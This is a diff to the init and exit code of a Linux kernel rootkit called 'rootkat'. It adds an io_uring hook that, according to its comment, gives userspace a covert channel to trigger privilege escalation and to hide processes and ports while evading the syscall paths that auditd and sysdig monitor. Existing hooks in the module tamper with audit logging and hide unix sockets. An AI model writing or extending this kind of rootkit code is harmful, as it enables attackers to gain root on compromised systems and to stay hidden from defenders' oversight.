@@ -15,6 +15,7 @@
 #include "hook_audit.h"
 #include "hook_unix_seq_show.h"
 #include "hook_unix_diag.h"
+#include "hook_io_issue_sqe.h"
 #include "hidden_unix_paths.h"
 
 #define ROOTKAT_TAG "rootkat: "
@@ -114,12 +115,22 @@ static int __init rootkat_init(void)
 		pr_warn(ROOTKAT_TAG "unix_diag hook failed: %d (ss -lx not closed)\n",
 		        rc);
 
+	/* Non-fatal: io_uring covert-channel control surface. Lets a
+	 * userspace process trigger privesc / hide-pid / hide-port via
+	 * an IORING_OP_NOP SQE with a magic user_data, bypassing the
+	 * kill-syscall path that auditd/sysdig typically watch. */
+	rc = rootkat_hook_io_issue_sqe_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "io_issue_sqe hook failed: %d (io_uring covert channel down)\n",
+		        rc);
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_io_issue_sqe_remove();
 	rootkat_hook_unix_diag_remove();
 	rootkat_hook_unix_seq_show_remove();
 	rootkat_hook_audit_log_start_remove();
